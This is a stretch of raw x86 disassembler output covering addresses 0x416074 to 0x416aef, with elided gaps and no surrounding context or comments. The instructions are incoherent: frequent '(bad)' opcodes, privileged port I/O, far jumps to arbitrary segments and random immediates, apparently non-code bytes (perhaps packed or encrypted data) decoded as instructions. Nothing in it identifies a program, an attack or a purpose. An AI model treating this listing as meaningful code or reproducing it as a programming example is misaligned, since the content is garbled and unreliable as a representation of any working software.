  416074:	or     BYTE PTR [esi+0xf5ab63c],dh
  41607a:	jecxz  0x416090
  41607c:	or     BYTE PTR [esi],al
  41607e:	lss    eax,FWORD PTR [eax]
  416081:	xchg   BYTE PTR [eax-0x6f802a01],bh
  416087:	jnp    0x4160ff
  416089:	jmp    0x3021:0x9540f27e
  416090:	and    DWORD PTR [ebp-0x80],ecx
  416093:	inc    ebp
  416094:	iret   
  416095:	ins    BYTE PTR es:[edi],dx
  416096:	inc    ecx
  416097:	scas   eax,DWORD PTR es:[edi]
  416098:	cmp    BYTE PTR [edx-0x7],bl
  41609b:	imul   esi,ebp,0xcde16f74
  4160a1:	cmp    eax,0xb6a6957
  4160a6:	shl    BYTE PTR [ebx+0x5ce9d41f],0xa6
  4160ad:	stc    
  4160ae:	in     eax,0x89
  4160b0:	add    al,0xc2
  4160b2:	mov    esp,0xf934
	...
  416113:	add    BYTE PTR [eax],al
  416115:	add    BYTE PTR [eax],ah
  416117:	jmp    0xdf3d3f57
  41611c:	in     eax,0xff
  41611e:	and    bl,BYTE PTR [ebx+0xf081187]
  416124:	adc    eax,ecx
  416126:	mov    fs,esi
  416128:	add    BYTE PTR [eax],al
  41612a:	pop    es
  41612b:	add    DWORD PTR [eax],eax
  41612d:	add    BYTE PTR [edi-0x20],dl
  416130:	mov    ch,0x7f
  416132:	or     BYTE PTR [ebp+0x4f],dl
  416135:	dec    DWORD PTR fs:[edx]
  416138:	sub    al,0x3c
  41613a:	adc    BYTE PTR [edi-0x4b],dh
  41613d:	xor    dl,cl
  41613f:	cmp    ebx,DWORD PTR [ebx+0x5626fd5d]
  416145:	in     al,dx
  416146:	jle    0x41610b
  416148:	rol    BYTE PTR [esi+edx*1],1
  41614b:	out    dx,eax
  41614c:	fisttp DWORD PTR [ebx]
  41614e:	(bad)  
  41614f:	cmp    DWORD PTR ds:0xcdc4eb95,esp
  416155:	mov    esp,0x201da503
  41615a:	outs   dx,DWORD PTR ds:[esi]
  41615b:	mov    ah,0x8c
  41615d:	sub    BYTE PTR [ebx+edi*1-0x1c],dh
  416161:	mov    bh,0xd6
  416163:	icebp  
  416164:	push   esp
  416165:	in     al,0x9
  416167:	xor    bl,BYTE PTR [edx+ebx*8]
  41616a:	jecxz  0x41613f
  41616c:	int    0xd4
  41616e:	mov    edi,0xe4ba3074
  416173:	les    esi,FWORD PTR [edx-0x6e]
  416176:	(bad)  
  416177:	imul   DWORD PTR [esi+0x6c]
  41617a:	jmp    0x4ad3:0x3b4d3df2
  416181:	push   edi
  416182:	idiv   DWORD PTR [ecx-0xb9ca526]
  416188:	dec    esi
  416189:	test   al,ah
  41618b:	inc    esi
  41618c:	sahf   
  41618d:	push   0x5d269719
  416192:	sub    BYTE PTR [eax+0x7758bce6],0xd2
  416199:	push   cs
  41619a:	loopne 0x416143
  41619c:	xchg   ecx,eax
  41619d:	rcl    DWORD PTR [edx+0x4dc7a0d7],cl
  4161a3:	jg     0x41613b
  4161a5:	mov    ss,WORD PTR [edi+ebp*8]
  4161a8:	fnsetpm(287 only) 
  4161aa:	cdq    
  4161ab:	mov    dh,0xa0
  4161ad:	jns    0x41618b
  4161af:	and    BYTE PTR [esi],bl
  4161b1:	call   0xea62d5f1
  4161b6:	adc    dh,BYTE PTR [edi+0x5c1571b5]
  4161bc:	adc    dh,ah
  4161be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4161bf:	mov    al,0x61
  4161c1:	push   ds
  4161c2:	or     eax,0x3e480747
  4161c7:	popf   
  4161c8:	and    dh,al
  4161ca:	(bad)  
  4161cb:	rcl    DWORD PTR [edi-0x6b],1
  4161ce:	fidiv  WORD PTR [ebx+0x43937508]
  4161d4:	es jne 0x41618c
  4161d7:	xor    al,BYTE PTR [edx-0xa]
  4161da:	jae    0x4161a1
  4161dc:	jno    0x41624c
  4161de:	out    dx,eax
  4161df:	sub    esi,DWORD PTR [ecx-0x3e]
  4161e2:	jno    0x416242
  4161e4:	call   0x7dc71f92
  4161e9:	loopne 0x4161a9
  4161eb:	call   0x52682daa
  4161f0:	stos   DWORD PTR es:[edi],eax
  4161f1:	xor    al,0x92
  4161f3:	sbb    bl,BYTE PTR [esi]
  4161f5:	stos   BYTE PTR es:[edi],al
  4161f6:	xor    al,0x88
  4161f8:	mov    ds:0x2fd17ce1,al
  4161fd:	xor    eax,0xde4ae8ca
  416202:	mov    cl,0x1f
  416204:	cli    
  416205:	jge    0x4161b2
  416207:	adc    dh,BYTE PTR [ecx]
  416209:	cmc    
  41620a:	nop
  41620b:	sets   BYTE PTR [ecx+0x7b20998c]
  416212:	mov    eax,0xbadc3bc6
  416217:	mul    DWORD PTR [edx+0x2204156a]
  41621d:	ins    BYTE PTR es:[edi],dx
  41621e:	cli    
  41621f:	leave  
  416220:	nop
  416221:	xor    bh,BYTE PTR [edx]
  416223:	fistp  DWORD PTR [edx+0x2f]
  416226:	mov    edx,0x905b5172
  41622b:	adc    edx,ebp
  41622d:	test   eax,0x30771a2f
  416232:	fs jg  0x416282
	...
  416295:	add    BYTE PTR [ebx],ah
  416297:	outs   dx,BYTE PTR ds:[esi]
  416298:	xor    ah,BYTE PTR ds:0x6e377d7f
  41629e:	test   BYTE PTR [esi-0x63df0922],bh
  4162a4:	call   0x700:0xe795e1
  4162ab:	add    DWORD PTR [eax],eax
  4162ad:	add    BYTE PTR [ebx+edi*4-0x6dcd040b],ah
  4162b4:	jnp    0x41632d
  4162b6:	test   DWORD PTR [edx-0x43eaf55e],ebp
  4162bc:	(bad)  
  4162bd:	jge    0x4162fd
  4162bf:	xor    DWORD PTR [ebp+ecx*8-0x44],0x2d
  4162c4:	loop   0x4162ed
  4162c6:	xor    eax,0xf0dd590f
  4162cb:	aas    
  4162cc:	push   ebx
  4162cd:	pop    ss
  4162ce:	sub    al,0x96
  4162d0:	shr    DWORD PTR [ecx-0x28],cl
  4162d3:	imul   edx,DWORD PTR ds:[ebp-0x63],0x5b
  4162d8:	imul   ebp,DWORD PTR [edi+edx*2-0x4b],0x2d
  4162dd:	sbb    ebx,ebp
  4162df:	mov    dl,0x72
  4162e1:	bound  edi,QWORD PTR [esi]
  4162e3:	cmpps  xmm1,XMMWORD PTR [esi],0x8
  4162e7:	push   esp
  4162e8:	hlt    
  4162e9:	and    ch,BYTE PTR [esi+0x50]
  4162ec:	out    dx,al
  4162ed:	out    dx,al
  4162ee:	rcr    DWORD PTR [ebx],cl
  4162f0:	sbb    ah,BYTE PTR [ebp+edx*1-0x38812059]
  4162f7:	pop    es
  4162f8:	xchg   ecx,eax
  4162f9:	(bad)  
  4162fb:	lds    edi,FWORD PTR [edi]
  4162fd:	cmp    al,0xea
  4162ff:	test   BYTE PTR [edx+0x4b],0x5b
  416303:	fcmovnu st,st(2)
  416305:	sbb    edx,DWORD PTR [eax]
  416307:	cmp    dh,BYTE PTR [edx+esi*2-0x58e79443]
  41630e:	aam    0x90
  416310:	or     ebp,DWORD PTR [ecx-0x38145a30]
  416316:	cmp    al,0xa5
  416318:	nop
  416319:	dec    ebx
  41631a:	pop    eax
  41631b:	inc    esp
  41631c:	xchg   bl,al
  41631e:	cmc    
  41631f:	dec    ebp
  416320:	and    eax,0x9362c53a
  416325:	in     eax,0x67
  416327:	call   0x540:0x377db12d
  41632e:	dec    esp
  41632f:	lods   eax,DWORD PTR ds:[esi]
  416330:	in     al,dx
  416331:	mov    eax,ds:0xe48270fc
  416336:	sbb    bh,BYTE PTR [edx-0x6ab0494d]
  41633c:	ds loop 0x4162dd
  41633f:	ja     0x4162e7
  416341:	scas   al,BYTE PTR es:[edi]
  416342:	daa    
  416343:	sub    ecx,DWORD PTR [eax+0x6f6ab035]
  416349:	bound  edi,QWORD PTR [edx+0x6f035d55]
  41634f:	xor    al,0x60
  416351:	cmp    bl,ch
  416353:	pop    esi
  416354:	call   0x2964:0x8f4c96d3
  41635b:	cwde   
  41635c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41635d:	inc    ecx
  41635e:	push   edi
  41635f:	push   edx
  416360:	inc    ebx
  416361:	jo     0x41633a
  416363:	scas   eax,DWORD PTR es:[edi]
  416364:	in     eax,0x68
  416366:	mov    ebp,0x5108ede5
  41636b:	mov    bh,0x14
  41636d:	xor    dl,BYTE PTR [ebx+eiz*4]
  416370:	xchg   edi,eax
  416371:	add    ch,BYTE PTR [eax]
  416373:	and    eax,0x23b2e224
  416378:	cs cmc 
  41637a:	inc    edx
  41637b:	or     bh,BYTE PTR [edx*2-0x20f3f51f]
  416382:	pop    es
  416383:	das    
  416384:	push   eax
  416385:	xor    ebp,DWORD PTR [edx]
  416387:	xchg   al,dh
  416389:	arpl   WORD PTR [ebx+0x5a],cx
  41638c:	cmp    al,0xf4
  41638e:	(bad)  
  41638f:	out    0x10,al
  416391:	in     al,dx
  416392:	dec    esp
  416393:	imul   ebp,DWORD PTR [esi],0x37
  416396:	xchg   ebx,eax
  416397:	mov    dh,0x14
  416399:	cmp    eax,0xf28ea5ae
  41639e:	stos   BYTE PTR es:[edi],al
  41639f:	int3   
  4163a0:	(bad)  
  4163a1:	and    ebx,ebp
  4163a3:	add    bh,BYTE PTR [esi+0xa]
  4163a6:	test   eax,0xebb154a6
  4163ab:	fcomp  DWORD PTR [esi-0x3486beab]
  4163b1:	lods   eax,DWORD PTR ds:[esi]
  4163b2:	and    BYTE PTR [eax],al
  4163b4:	mov    cl,0x0
	...
  416416:	repz inc ebx
  416418:	ror    cl,1
  41641a:	lock (bad) 
  41641d:	jnp    0x416481
  41641f:	xchg   esi,eax
  416420:	cmp    DWORD PTR [ebp+0x542d2b96],edx
  416426:	pushf  
  416427:	call   0x148642c
  41642c:	add    BYTE PTR [eax],al
  41642e:	dec    ebx
  41642f:	mov    ebp,0x231108a1
  416434:	mov    BYTE PTR [esi],ch
  416436:	sub    eax,0x136e649b
  41643b:	push   0x22
  41643d:	jecxz  0x41640d
  41643f:	adc    cl,BYTE PTR [esi-0x267e92ff]
  416445:	fst    DWORD PTR [ecx-0x727ead3c]
  41644b:	out    dx,al
  41644c:	pop    ss
  41644d:	mov    ds:0xafe980da,eax
  416452:	(bad)  
  416453:	cld    
  416454:	retf   
  416455:	bound  esi,QWORD PTR [edx]
  416457:	mov    ecx,0xad4f85fb
  41645c:	cwde   
  41645d:	sub    dl,BYTE PTR [ecx+0x2e]
  416460:	mov    ch,0x7d
  416462:	fs mov dl,0xf9
  416465:	xchg   esp,eax
  416466:	push   ecx
  416467:	adc    edi,DWORD PTR [edx+0x29]
  41646a:	inc    ebx
  41646b:	jge    0x4164df
  41646d:	lds    edi,FWORD PTR [edi]
  41646f:	mov    ah,0x7a
  416471:	mov    esp,0xe87578e9
  416476:	dec    esp
  416477:	sbb    DWORD PTR [ebx-0x6d],esp
  41647a:	dec    ecx
  41647b:	sub    BYTE PTR [edi],bl
  41647d:	ja     0x416484
  41647f:	sti    
  416480:	sbb    eax,DWORD PTR [eax-0x18a3ef1c]
  416486:	test   BYTE PTR [ecx-0x35],bl
  416489:	sbb    ebx,DWORD PTR [esp+eiz*8+0x21]
  41648d:	add    eax,0x85617ace
  416492:	(bad)  
  416493:	sahf   
  416494:	add    BYTE PTR [ecx-0x46506bac],0x39
  41649b:	scas   al,BYTE PTR es:[edi]
  41649c:	loope  0x416501
  41649e:	mov    dh,0xe1
  4164a0:	test   eax,0x9d8434fe
  4164a5:	bound  esi,QWORD PTR [esi-0x7f077ce1]
  4164ab:	shl    bh,0xfa
  4164ae:	mov    edx,0x74172282
  4164b3:	aaa    
  4164b4:	inc    esi
  4164b5:	pop    edx
  4164b6:	cdq    
  4164b7:	push   ebx
  4164b8:	js     0x416515
  4164ba:	sti    
  4164bb:	pop    esi
  4164bc:	jo     0x416512
  4164be:	scas   al,BYTE PTR es:[edi]
  4164bf:	xor    DWORD PTR [esi-0x51465ec1],edx
  4164c5:	repz fsub st,st(6)
  4164c8:	or     eax,0x56dc4bc3
  4164cd:	inc    ebp
  4164ce:	(bad)  
  4164cf:	outs   dx,DWORD PTR ds:[esi]
  4164d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4164d1:	jnp    0x416547
  4164d3:	(bad)  
  4164d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4164d5:	xchg   ebx,eax
  4164d6:	ss out dx,eax
  4164d8:	push   0xffffff92
  4164da:	(bad)  
  4164db:	push   ecx
  4164dc:	es mov eax,0x1e321dba
  4164e2:	dec    ecx
  4164e3:	pop    edx
  4164e4:	test   DWORD PTR ds:0x581c27c5,eax
  4164ea:	pop    ebp
  4164eb:	inc    edx
  4164ec:	or     DWORD PTR [edi-0x377e9cb8],ebx
  4164f2:	push   ss
  4164f3:	daa    
  4164f4:	jmp    0x416487
  4164f6:	call   0x5dad198e
  4164fb:	mov    dl,0x24
  4164fd:	push   ebp
  4164fe:	cmp    ebx,DWORD PTR [ebx+0x516e35e3]
  416504:	scas   eax,DWORD PTR es:[edi]
  416505:	jmp    0x416551
  416507:	stc    
  416508:	add    edx,DWORD PTR [edx]
  41650a:	push   edx
  41650b:	lods   eax,DWORD PTR ds:[esi]
  41650c:	xchg   edi,eax
  41650d:	cli    
  41650e:	repnz sub esi,DWORD PTR [edi+0x5e]
  416512:	addr16 mov cl,0x4e
  416515:	fisttp WORD PTR [ebx-0x74]
  416518:	lahf   
  416519:	pusha  
  41651a:	jae    0x41658a
  41651c:	lods   al,BYTE PTR ds:[esi]
  41651d:	xchg   DWORD PTR [esi],edx
  41651f:	push   ss
  416520:	pop    esp
  416521:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416522:	push   esi
  416523:	adc    al,0x13
  416525:	aaa    
  416526:	pop    ebx
  416527:	pusha  
  416528:	mov    al,0xae
  41652a:	jae    0x4164c3
  41652c:	fstp   st(5)
  41652e:	es mov dl,0xed
  416531:	aas    
  416532:	scas   eax,DWORD PTR es:[edi]
  416533:	je     0x4165a8
	...
  416595:	add    BYTE PTR ds:0xfff32bd8,ah
  41659b:	repz std 
  41659d:	fisubr WORD PTR [edi+ebp*1+0x72]
  4165a1:	jno    0x4165df
  4165a3:	inc    esp
  4165a4:	sub    eax,0xe9a351
  4165a9:	add    BYTE PTR [edi],al
  4165ab:	add    DWORD PTR [eax],eax
  4165ad:	add    BYTE PTR ds:0x92d15919,ah
  4165b3:	mov    cl,BYTE PTR [edi-0x167c24f9]
  4165b9:	sbb    DWORD PTR [esi-0xd],edx
  4165bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4165bd:	mov    ebx,0xba171891
  4165c2:	ja     0x416558
  4165c4:	popa   
  4165c5:	cmp    DWORD PTR [ecx+eiz*1+0x3f],edi
  4165c9:	es xor al,0xb2
  4165cc:	dec    ecx
  4165cd:	clc    
  4165ce:	scas   eax,DWORD PTR es:[edi]
  4165cf:	aaa    
  4165d0:	and    DWORD PTR [esi-0x7f],eax
  4165d3:	inc    ebp
  4165d4:	in     al,dx
  4165d5:	or     eax,0xb6fce16
  4165da:	jecxz  0x416602
  4165dc:	popa   
  4165dd:	out    0xa8,al
  4165df:	in     eax,dx
  4165e0:	mov    dl,0x74
  4165e2:	and    edx,DWORD PTR fs:[edx+0x2d]
  4165e6:	jl     0x416580
  4165e8:	(bad)  
  4165e9:	ficom  WORD PTR [esi-0x70ec34eb]
  4165ef:	add    eax,0x373d8da0
  4165f4:	dec    eax
  4165f5:	pop    ss
  4165f6:	sbb    eax,0x16d67ce2
  4165fb:	test   al,0x74
  4165fd:	lods   eax,DWORD PTR ds:[esi]
  4165fe:	sbb    dh,ch
  416600:	jbe    0x416635
  416602:	mov    esp,0xc9bf0fe4
  416607:	loop   0x4165a7
  416609:	test   eax,0x2b66b0dc
  41660e:	out    0xe0,eax
  416610:	push   ebp
  416611:	addr16 mov dl,0x4c
  416614:	and    al,0x53
  416616:	arpl   WORD PTR [ebx+0x53609d3a],bx
  41661c:	leave  
  41661d:	xlat   BYTE PTR ds:[ebx]
  41661e:	dec    dx
  416620:	call   0x1439f1dd
  416625:	cmp    DWORD PTR [eax+eiz*2],edi
  416628:	and    BYTE PTR [eax+0x65],dl
  41662b:	jp     0x4165d7
  41662d:	push   ss
  41662e:	stc    
  41662f:	(bad)  
  416630:	cwde   
  416631:	jne    0x41661b
  416633:	sub    dl,BYTE PTR [edi]
  416635:	pop    ds
  416636:	xor    eax,0xcbbe8794
  41663b:	adc    BYTE PTR [edx+0x580ef9b4],al
  416641:	cmp    eax,0x6f69ff64
  416646:	inc    edx
  416647:	xor    DWORD PTR [edi+0x7a],edi
  41664a:	and    eax,0xc39dab34
  41664f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416650:	sub    dh,BYTE PTR [eax+0x4a]
  416653:	mov    edi,0x2c304372
  416658:	mov    WORD PTR [ebx+0x3c],gs
  41665b:	jbe    0x4165f1
  41665d:	jmp    0x4166ae
  41665f:	mov    ecx,0x5998589f
  416664:	stc    
  416665:	rcr    BYTE PTR [ebp-0x274685e0],0x15
  41666c:	ja     0x416639
  41666e:	mov    edx,DWORD PTR [ebp-0x16]
  416671:	imul   esi,DWORD PTR [esp+ebp*8],0xffffffdc
  416675:	out    0x32,al
  416677:	aad    0x82
  416679:	jb     0x41661f
  41667b:	retf   
  41667c:	pop    es
  41667d:	out    dx,eax
  41667e:	jp     0x41669c
  416680:	pop    ds
  416681:	cwde   
  416682:	push   ecx
  416683:	clc    
  416684:	sub    eax,0xe4764040
  416689:	(bad)  
  41668a:	imul   ebx,ebx,0xffffff96
  41668d:	jp     0x4166a4
  41668f:	dec    esp
  416690:	retf   
  416691:	aam    0x2d
  416693:	iret   
  416694:	mov    BYTE PTR [edx+0x10a8e16e],ch
  41669a:	mov    ebp,0x604fce51
  41669f:	fisub  DWORD PTR [ebx]
  4166a1:	and    DWORD PTR [ebp-0x43],ebx
  4166a4:	jae    0x4166f6
  4166a6:	xlat   BYTE PTR ds:[ebx]
  4166a7:	lahf   
  4166a8:	jno    0x4166bf
  4166aa:	xchg   esp,eax
  4166ab:	push   ebp
  4166ac:	push   edx
  4166ad:	in     eax,dx
  4166ae:	adc    DWORD PTR [eax],edx
  4166b0:	test   cl,cl
  4166b2:	pop    edx
  4166b3:	or     al,BYTE PTR ss:[eax]
	...
  416716:	(bad)  
  416717:	(bad)  
  416719:	(bad)  
  41671a:	(bad)  
  41671c:	out    0xff,eax
  41671e:	mov    ah,0x10
  416720:	mov    cl,0x4f
  416722:	mov    eax,DWORD PTR [ecx-0x28]
  416725:	aad    0xaa
  416727:	jmp    0x0:0x1070000
  41672e:	pop    ebp
  41672f:	and    eax,0x665bfcba
  416734:	sbb    dl,BYTE PTR [ecx+0x384f4740]
  41673a:	shr    BYTE PTR [ebx+0x2c1c79ab],0x7e
  416741:	(bad)  
  416742:	jge    0x416733
  416744:	lock pop esi
  416746:	add    bh,cl
  416748:	cld    
  416749:	aaa    
  41674a:	sbb    bh,dl
  41674c:	inc    esp
  41674d:	mov    edx,0x1194ade3
  416752:	repz jne 0x4167c8
  416755:	cli    
  416756:	test   BYTE PTR [ebp+0x48dbfe39],bh
  41675c:	xchg   ecx,eax
  41675d:	fucomi st,st(5)
  41675f:	lahf   
  416760:	out    dx,eax
  416761:	xor    edi,DWORD PTR [ebx]
  416763:	repz pop ebx
  416765:	add    BYTE PTR [ebx-0x32c0e145],cl
  41676b:	test   eax,0x2e41314c
  416770:	adc    eax,0x183bc397
  416775:	pushf  
  416776:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416777:	mov    al,gs:0x467dc190
  41677d:	icebp  
  41677e:	in     al,0xcd
  416780:	lock jb 0x416739
  416783:	xor    BYTE PTR ds:0xee3f28d4,cl
  416789:	dec    esi
  41678a:	int3   
  41678b:	mov    edi,0xf9c5cdf3
  416790:	out    0x61,eax
  416792:	lods   eax,DWORD PTR ds:[esi]
  416793:	xor    eax,0x53447b08
  416798:	mov    esi,0xe24bf322
  41679d:	scas   eax,DWORD PTR es:[edi]
  41679e:	dec    ecx
  41679f:	jle    0x4167e1
  4167a1:	std    
  4167a2:	sbb    eax,0x61c434e0
  4167a7:	scas   al,BYTE PTR es:[edi]
  4167a8:	dec    ecx
  4167a9:	cmp    BYTE PTR [ecx+edi*4+0x23],al
  4167ad:	popf   
  4167ae:	imul   esi,DWORD PTR [edi+0x74a94188],0x2
  4167b5:	test   BYTE PTR [eax-0x54115226],ah
  4167bb:	cdq    
  4167bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4167bd:	lahf   
  4167be:	mov    eax,ds:0xc963aed2
  4167c3:	pop    esi
  4167c4:	add    BYTE PTR [eax+0xb],0x93
  4167c8:	loop   0x4167df
  4167ca:	jmp    0x3dced593
  4167cf:	inc    eax
  4167d0:	out    dx,al
  4167d1:	pop    es
  4167d2:	sbb    eax,0x521877cb
  4167d7:	enter  0xb989,0xea
  4167db:	shl    BYTE PTR [edi-0xc],1
  4167de:	xchg   edi,eax
  4167df:	cdq    
  4167e0:	mov    esp,DWORD PTR [ebp+0x45]
  4167e3:	add    BYTE PTR [edi-0x611bd5d8],bl
  4167e9:	and    BYTE PTR [eax],0xd6
  4167ec:	jbe    0x41678b
  4167ee:	dec    esp
  4167ef:	test   DWORD PTR [edx],ebp
  4167f1:	or     dh,BYTE PTR [ecx+0x4caf2cb4]
  4167f7:	sbb    DWORD PTR [ebp+edi*2-0x56],edi
  4167fb:	jo     0x416806
  4167fd:	push   DWORD PTR [ebx]
  4167ff:	push   eax
  416800:	mov    dl,0x58
  416802:	scas   eax,DWORD PTR es:[edi]
  416803:	xor    DWORD PTR [ecx-0xf6179f6],edx
  416809:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41680a:	int    0x1f
  41680c:	rcr    BYTE PTR [eax-0x55],cl
  41680f:	jb     0x41683a
  416811:	cwde   
  416812:	mov    WORD PTR [eax],?
  416814:	sbb    al,0xb8
  416816:	add    ch,BYTE PTR [eax]
  416818:	mov    ecx,0x187377e3
  41681d:	call   FWORD PTR [esi-0x7]
  416820:	into   
  416821:	jmp    0xfc169845
  416826:	and    BYTE PTR [ecx+0x2c],bl
  416829:	dec    esi
  41682a:	out    0x8,eax
  41682c:	(bad)  
  41682d:	pop    ebp
  41682e:	push   ecx
  41682f:	mov    ds:0x3827d06a,eax
  416834:	jb     0x416836
	...
  416896:	shr    DWORD PTR [edi-0x4810cfa],1
  41689c:	cmc    
  41689d:	scas   eax,DWORD PTR es:[edi]
  41689e:	cwde   
  41689f:	sub    bh,al
  4168a1:	repnz mov esi,0xb11b128c
  4168a7:	jmp    0x4168a9
  4168a9:	add    BYTE PTR [edi],al
  4168ab:	add    DWORD PTR [eax],eax
  4168ad:	add    bh,ah
  4168af:	ins    DWORD PTR es:[edi],dx
  4168b0:	and    edx,edx
  4168b2:	clc    
  4168b3:	sbb    BYTE PTR [eax+eiz*8+0x716bb946],bh
  4168ba:	pop    ebp
  4168bb:	dec    ebp
  4168bc:	adc    DWORD PTR [ebp+0x1],esi
  4168bf:	nop
  4168c0:	inc    eax
  4168c1:	cmp    al,0xaa
  4168c3:	and    DWORD PTR [ebx+0x5d],ebp
  4168c6:	icebp  
  4168c7:	int    0xad
  4168c9:	loopne 0x4168f1
  4168cb:	ja     0x416854
  4168cd:	out    dx,al
  4168ce:	repnz mov esi,0x66138ad8
  4168d4:	cld    
  4168d5:	sbb    ch,dl
  4168d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4168d8:	scas   al,BYTE PTR es:[edi]
  4168d9:	dec    edi
  4168da:	adc    edx,0xffffffca
  4168dd:	je     0x41689d
  4168df:	retf   0xe006
  4168e2:	mov    ah,BYTE PTR [edi+0x9e9bc13]
  4168e8:	jae    0x41687a
  4168ea:	out    dx,eax
  4168eb:	inc    edi
  4168ec:	mov    ds:0x265d2257,eax
  4168f1:	ins    DWORD PTR es:[edi],dx
  4168f2:	ss aas 
  4168f4:	enter  0x39bd,0xb7
  4168f8:	fsubr  DWORD PTR ds:0x31f13ed4
  4168fe:	push   eax
  4168ff:	and    eax,DWORD PTR [eax-0x63ffcea7]
  416905:	out    0xb6,eax
  416907:	bound  ebp,QWORD PTR [edx]
  416909:	mov    edi,ecx
  41690b:	test   BYTE PTR [edx+eax*1+0x34],ch
  41690f:	and    eax,0xe39eac0a
  416914:	mov    ebp,0x571d0fd6
  416919:	cld    
  41691a:	inc    esi
  41691b:	mov    ecx,0xbc503994
  416920:	mov    dh,0x3f
  416922:	scas   al,BYTE PTR es:[edi]
  416923:	std    
  416924:	adc    ah,dl
  416926:	mov    edx,0xc1bc59cd
  41692b:	push   ecx
  41692c:	push   eax
  41692d:	xor    edx,DWORD PTR [eax-0x7acbd4b9]
  416933:	mov    al,ds:0x95601317
  416938:	push   esp
  416939:	inc    esi
  41693a:	ja     0x416970
  41693c:	in     eax,0x53
  41693e:	mov    ch,0x53
  416940:	(bad)  
  416941:	mov    bl,0xa2
  416943:	jmp    0xca287b7d
  416948:	ret    0x19b7
  41694b:	mov    dl,0x99
  41694d:	sahf   
  41694e:	call   0xca02db77
  416953:	ja     0x416940
  416955:	cwde   
  416956:	mov    ecx,0xa017cb8b
  41695b:	and    BYTE PTR [ebx-0x6f],ch
  41695e:	and    BYTE PTR [ecx-0x19d8ea6d],al
  416964:	or     DWORD PTR [eax+ebp*8],esp
  416967:	sub    BYTE PTR [eax-0x56],dl
  41696a:	adc    bh,ch
  41696c:	repz push eax
  41696e:	pop    ebp
  41696f:	dec    eax
  416970:	ss push 0x42182fae
  416976:	pusha  
  416977:	jge    0x41699e
  416979:	jp     0x416969
  41697b:	mov    ah,0x40
  41697d:	out    dx,al
  41697e:	leave  
  41697f:	rol    esi,0x42
  416982:	push   ecx
  416983:	lahf   
  416984:	dec    edx
  416985:	xchg   ebp,eax
  416986:	arpl   WORD PTR [esi-0x47],dx
  416989:	into   
  41698a:	xchg   ebx,eax
  41698b:	fisub  WORD PTR [edx+0x2]
  41698e:	in     al,0xf
  416990:	jno    0x4169f4
  416992:	dec    esi
  416993:	adc    ebp,DWORD PTR [edi-0x467eb683]
  416999:	arpl   WORD PTR [edi],di
  41699b:	or     dh,bl
  41699d:	loope  0x41693b
  41699f:	test   DWORD PTR [ebx+edi*2-0x29],edi
  4169a3:	inc    ebp
  4169a4:	fucom  st(1)
  4169a6:	push   ss
  4169a7:	dec    eax
  4169a8:	inc    ebx
  4169a9:	popf   
  4169aa:	pop    ds
  4169ab:	dec    eax
  4169ac:	int    0x10
  4169ae:	pop    ebp
  4169af:	(bad)  
  4169b1:	add    al,0xaa
  4169b3:	sub    DWORD PTR [edx+0x0],0x0
	...
  416a16:	retf   
  416a17:	pusha  
  416a18:	ror    BYTE PTR [ebx+0x60dbbbfb],1
  416a1e:	enter  0x4aea,0x13
  416a22:	jae    0x416a31
  416a24:	mov    dl,al
  416a26:	mov    eax,0x70000ec
  416a2b:	add    DWORD PTR [eax],eax
  416a2d:	add    BYTE PTR [ecx-0x5570983],bl
  416a33:	(bad)  
  416a34:	sbb    eax,0x6f60405
  416a39:	shr    BYTE PTR [ecx-0x852f21b],0x91
  416a40:	xchg   esp,eax
  416a41:	push   ecx
  416a42:	adc    eax,0x19d68cca
  416a47:	adc    eax,0xb9420a6
  416a4c:	inc    eax
  416a4d:	fist   DWORD PTR [edi+edx*2-0x17b56580]
  416a54:	jb     0x416a43
  416a56:	daa    
  416a57:	(bad)  
  416a58:	sub    cl,al
  416a5a:	fadd   QWORD PTR [eax-0xf]
  416a5d:	mov    eax,0x3059a084
  416a62:	(bad)  [ecx-0x2]
  416a65:	imul   edx,DWORD PTR [esi-0x70ef5670],0x4c
  416a6c:	cmp    DWORD PTR [ebp+0x9],esp
  416a6f:	jl     0x416aee
  416a71:	shl    edx,1
  416a73:	int3   
  416a74:	mov    esp,0x29ef0e4
  416a79:	fcom   DWORD PTR [eax-0x21dcf445]
  416a7f:	or     al,0x41
  416a81:	cmp    al,0x8
  416a83:	mov    esp,0xda24c397
  416a88:	xchg   ecx,eax
  416a89:	and    ebx,DWORD PTR [ecx]
  416a8b:	cmp    eax,DWORD PTR [esi+0x70]
  416a8e:	(bad)  
  416a8f:	mov    edi,DWORD PTR [esi+ecx*1]
  416a92:	inc    esi
  416a93:	fnstsw WORD PTR [ebp+0x3b]
  416a96:	mov    dh,0x8a
  416a98:	mov    eax,ds:0xb64a97fb
  416a9d:	sahf   
  416a9e:	out    0x55,al
  416aa0:	inc    edx
  416aa1:	push   esi
  416aa2:	fwait
  416aa3:	xor    ch,BYTE PTR [eax+0x526454b8]
  416aa9:	stc    
  416aaa:	ds jne 0x416ad3
  416aad:	mov    esp,0x399daf06
  416ab2:	mov    al,0xdf
  416ab4:	cli    
  416ab5:	and    al,0x5
  416ab7:	in     eax,dx
  416ab8:	add    DWORD PTR [ebx],ebx
  416aba:	jo     0x416a84
  416abc:	jb     0x416b04
  416abe:	add    ebx,eax
  416ac0:	mov    dh,BYTE PTR [esi]
  416ac2:	pop    eax
  416ac3:	sub    eax,0xc3751b2
  416ac8:	call   DWORD PTR [edx-0x43]
  416acb:	ror    BYTE PTR [ebp+edi*1+0x2870420c],cl
  416ad2:	mov    esi,0x2d6292ce
  416ad7:	sbb    al,0x26
  416ad9:	es in  eax,dx
  416adb:	bnd jp 0x416b58
  416ade:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416adf:	push   cs
  416ae0:	jle    0x416b4a
  416ae2:	and    BYTE PTR [edi-0x2],0xfd
  416ae6:	and    cl,BYTE PTR [ebp+0x5fc4e5f7]
  416aec:	jne    0x416a8e
  416aee:	iret   
  416aef:	adc    esp,DWORD PTR [ebp+0x1d]
